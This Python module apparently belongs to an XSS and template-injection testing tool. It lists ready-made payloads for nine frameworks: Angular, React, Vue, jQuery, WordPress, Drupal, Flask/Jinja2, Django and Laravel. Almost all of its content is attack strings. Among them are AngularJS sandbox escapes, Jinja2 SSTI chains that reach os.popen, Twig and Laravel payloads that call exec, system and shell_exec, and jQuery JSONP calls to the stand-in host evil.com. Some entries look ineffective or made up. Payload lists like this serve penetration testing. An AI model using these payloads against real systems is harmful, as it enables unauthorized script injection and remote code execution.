#!/usr/bin/env python3

"""
Framework-Specific XSS Payloads

Payloads targeting specific web frameworks and technologies.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class FrameworkSpecificPayloads:
    """Framework-specific XSS payload collection"""
    
    @staticmethod
    def get_angular_payloads() -> List[str]:
        """AngularJS/Angular specific XSS payloads"""
        return [
            # AngularJS expression injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{$eval.constructor(\'alert(1)\')()}}',
            '{{$new.constructor(\'alert(1)\')()}}',
            '{{$on.constructor(\'alert(1)\')()}}',
            
            # Bypass ng-src
            '{{constructor.constructor(\'document.location="javascript:alert(1)"\')()}}',
            '{{constructor.constructor(\'window.open("javascript:alert(1)")\')()}}',
            
            # Filter bypass
            '{{\'"\\n\\u0000alert(1)"\'}}',
            '{{x=\'alert(1)\';constructor.constructor(x)()}}',
            
            # Context-specific bypasses
            'ng-focus="constructor.constructor(\'alert(1)\')()" autofocus',
            'ng-click="constructor.constructor(\'alert(1)\')()"',
            'ng-mouseover="constructor.constructor(\'alert(1)\')()"',
            
            # Template injection
            '{{7*7}}{{constructor.constructor(\'alert(1)\')()}}',
            '{{[].constructor.constructor(\'alert(1)\')()}}',
            '{{{}[\"constructor\"][\"constructor\"](\"alert(1)\")()}}',
            
            # Prototype pollution
            '{{constructor.constructor.prototype.alert=alert}}{{constructor.constructor.prototype.alert(1)}}',
            
            # Sandbox bypass (older AngularJS)
            '{{x={y:1};x.y.toString.constructor(\'alert(1)\')()}}',
            '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].sort(toString.constructor)}}',
            
            # Angular 2+ template injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '${7*7}{{7*7}}',
            
            # Event binding injection
            '(click)="constructor.constructor(\'alert(1)\')()" ',
            '(focus)="constructor.constructor(\'alert(1)\')()" autofocus',
            '(mouseover)="constructor.constructor(\'alert(1)\')()"',
        ]
    
    @staticmethod
    def get_react_payloads() -> List[str]:
        """React specific XSS payloads"""
        return [
            # JSX injection
            '<img src="x" onerror="alert(1)" />',
            '<div dangerouslySetInnerHTML={{__html: \'<script>alert(1)</script>\'}}></div>',
            '<div dangerouslySetInnerHTML={{__html: \'<img src=x onerror=alert(1)>\'}}></div>',
            
            # Props injection
            'javascript:alert(1)',
            '" onmouseover="alert(1)" "',
            '\' onmouseover=\'alert(1)\' \'',
            
            # href injection
            '<a href="javascript:alert(1)">Click</a>',
            '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
            
            # Server-side rendering injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '${alert(1)}',
            '#{alert(1)}',
            
            # React Router injection
            '<Link to="javascript:alert(1)">Click</Link>',
            '<Navigate to="javascript:alert(1)" />',
            
            # State injection
            'constructor.constructor("alert(1)")()',
            'Object.constructor.constructor("alert(1)")()',
            
            # Event handler injection
            'onClick="alert(1)"',
            'onMouseOver="alert(1)"',
            'onFocus="alert(1)"',
            'onLoad="alert(1)"',
            
            # Style injection
            '<div style="background:url(javascript:alert(1))"></div>',
            '<div style="expression(alert(1))"></div>',
        ]
    
    @staticmethod
    def get_vue_payloads() -> List[str]:
        """Vue.js specific XSS payloads"""
        return [
            # Template injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{$el.ownerDocument.defaultView.alert(1)}}',
            '{{$root.constructor.constructor(\'alert(1)\')()}}',
            
            # Directive injection
            'v-html="\'<script>alert(1)</script>\'"',
            'v-html="\'<img src=x onerror=alert(1)>\'"',
            ':innerHTML="\'<script>alert(1)</script>\'"',
            
            # Event handler injection
            '@click="constructor.constructor(\'alert(1)\')"',
            'v-on:click="constructor.constructor(\'alert(1)\')"',
            '@focus="constructor.constructor(\'alert(1)\')" autofocus',
            '@mouseover="constructor.constructor(\'alert(1)\')"',
            
            # Filter bypass
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{this.constructor.constructor(\'alert(1)\')()}}',
            '{{$root.$el.ownerDocument.defaultView.alert(1)}}',
            
            # Computed property injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{Object.constructor.constructor(\'alert(1)\')()}}',
            
            # v-for injection
            'v-for="item in constructor.constructor(\'alert(1)\')"',
            
            # Slot injection
            '<slot>{{constructor.constructor(\'alert(1)\')()}}</slot>',
            
            # Component injection
            '<component :is="constructor.constructor(\'alert(1)\')"></component>',
        ]
    
    @staticmethod
    def get_jquery_payloads() -> List[str]:
        """jQuery specific XSS payloads"""
        return [
            # $() injection
            '$("<script>alert(1)</script>").appendTo("body")',
            '$("<img src=x onerror=alert(1)>").appendTo("body")',
            '$("<svg onload=alert(1)>").appendTo("body")',
            
            # html() injection
            '$("body").html("<script>alert(1)</script>")',
            '$("div").html("<img src=x onerror=alert(1)>")',
            
            # attr() injection
            '$("img").attr("src","javascript:alert(1)")',
            '$("a").attr("href","javascript:alert(1)")',
            '$("iframe").attr("src","javascript:alert(1)")',
            
            # append/prepend injection
            '$("body").append("<script>alert(1)</script>")',
            '$("head").prepend("<script>alert(1)</script>")',
            
            # Event injection
            '$("body").on("click",function(){alert(1)})',
            '$("*").bind("mouseover",function(){alert(1)})',
            
            # JSONP callback injection
            '$.getJSON("//evil.com/jsonp?callback=alert")',
            '$.ajax({url:"//evil.com",dataType:"jsonp",jsonpCallback:"alert"})',
            
            # globalEval injection
            '$.globalEval("alert(1)")',
            
            # parseHTML injection
            '$.parseHTML("<script>alert(1)</script>").appendTo("body")',
            '$.parseHTML("<img src=x onerror=alert(1)>").appendTo("body")',
        ]
    
    @staticmethod
    def get_wordpress_payloads() -> List[str]:
        """WordPress specific XSS payloads"""
        return [
            # Shortcode injection
            '[script]alert(1)[/script]',
            '[iframe src="javascript:alert(1)"]',
            
            # Comment injection
            '<!--<script>alert(1)</script>-->',
            
            # Plugin-specific
            '[gallery id="<script>alert(1)</script>"]',
            '[caption id="<script>alert(1)</script>"]',
            '[embed]<script>alert(1)</script>[/embed]',
            
            # Admin panel injection
            '" onclick="alert(1)" "',
            '\' onmouseover=\'alert(1)\' \'',
            'javascript:alert(1)',
            
            # Custom field injection
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # Theme injection
            '${alert(1)}',
            '{{alert(1)}}',
            '<%=alert(1)%>',
            
            # Widget injection
            '<script>alert(1)</script>',
            'javascript:alert(1)',
            '" onload="alert(1)" "',
        ]
    
    @staticmethod
    def get_drupal_payloads() -> List[str]:
        """Drupal specific XSS payloads"""
        return [
            # Filter bypass
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # Twig template injection
            '{{7*7}}{{_context.request.query.get("callback")}}',
            '{{dump(app)}}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("alert(1)")}}',
            
            # Text format bypass
            '[javascript:alert(1)]',
            '<a href="javascript:alert(1)">Click</a>',
            
            # Field injection
            '" onclick="alert(1)" "',
            '\' onmouseover=\'alert(1)\' \'',
            
            # Module-specific
            '[filter:javascript:alert(1)]',
            '[filter:eval:alert(1)]',
            
            # Node injection
            '<script>alert(1)</script>',
            'javascript:alert(1)',
            '" onload="alert(1)" "',
        ]
    
    @staticmethod
    def get_flask_jinja2_payloads() -> List[str]:
        """Flask/Jinja2 template injection payloads"""
        return [
            # Basic SSTI
            '{{7*7}}',
            '{{config}}',
            '{{self}}',
            '{{request}}',
            
            # RCE payloads
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'alert(1)\').read()}}',
            '{{request.__class__.__init__.__globals__[\'os\'].popen(\'alert(1)\').read()}}',
            '{{url_for.__globals__[\'os\'].popen(\'alert(1)\').read()}}',
            
            # Bypass filters
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'alert(1)\').read()}}',
            '{{lipsum.__globals__.os.popen(\'alert(1)\').read()}}',
            '{{cycler.__init__.__globals__.os.popen(\'alert(1)\').read()}}',
            
            # JavaScript injection in templates
            '<script>alert(1)</script>',
            '{{\'<script>alert(1)</script>\'|safe}}',
            '{{request.args.xss|safe}}',
            
            # Attribute injection
            '{{request.args.callback}}',
            '" onclick="{{request.args.callback}}" "',
            
            # URL injection
            '{{url_for(request.args.endpoint)}}',
            '{{redirect(request.args.url)}}',
        ]
    
    @staticmethod
    def get_django_payloads() -> List[str]:
        """Django specific XSS payloads"""
        return [
            # Template injection
            '{{7*7}}{{request.GET.callback}}',
            '{{block.super}}{{request.GET.xss}}',
            
            # Filter bypass
            '{{user.password|safe}}',
            '{{request.GET.xss|safe}}',
            '{{value|safe}}',
            
            # URL injection
            '{% url request.GET.view %}',
            '{% load request.GET.lib %}',
            
            # JavaScript in templates
            '<script>alert(1)</script>',
            '{{request.GET.callback|safe}}',
            
            # CSRF bypass
            '{% csrf_token %}{{request.GET.xss|safe}}',
            
            # Include injection
            '{% include request.GET.template %}',
            '{% extends request.GET.base %}',
            
            # Custom tags
            '{% request.GET.tag %}',
            '{% load request.GET.library %}',
        ]
    
    @staticmethod
    def get_laravel_payloads() -> List[str]:
        """Laravel/PHP specific XSS payloads"""
        return [
            # Blade template injection
            '{{7*7}}',
            '{!!request(\'xss\')!!}',
            '@{{request(\'xss\')}}',
            
            # PHP injection
            '<?php echo "alert(1)"; ?>',
            '{{phpinfo()}}',
            '{!!phpinfo()!!}',
            
            # Unescaped output
            '{!!$xss!!}',
            '{!!request()->get(\'xss\')!!}',
            
            # URL injection
            '{{url(request(\'callback\'))}}',
            '{{route(request(\'route\'))}}',
            
            # JavaScript in Blade
            '<script>alert(1)</script>',
            '@json($xss)',
            
            # Component injection
            '@component(request(\'component\'))',
            '@include(request(\'view\'))',
            
            # PHP functions
            '{{system(\'alert(1)\')}}',
            '{{exec(\'alert(1)\')}}',
            '{{shell_exec(\'alert(1)\')}}',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all framework-specific XSS payloads"""
        payloads = []
        payloads.extend(FrameworkSpecificPayloads.get_angular_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_react_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_vue_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_jquery_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_wordpress_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_drupal_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_flask_jinja2_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_django_payloads())
        payloads.extend(FrameworkSpecificPayloads.get_laravel_payloads())
        return payloads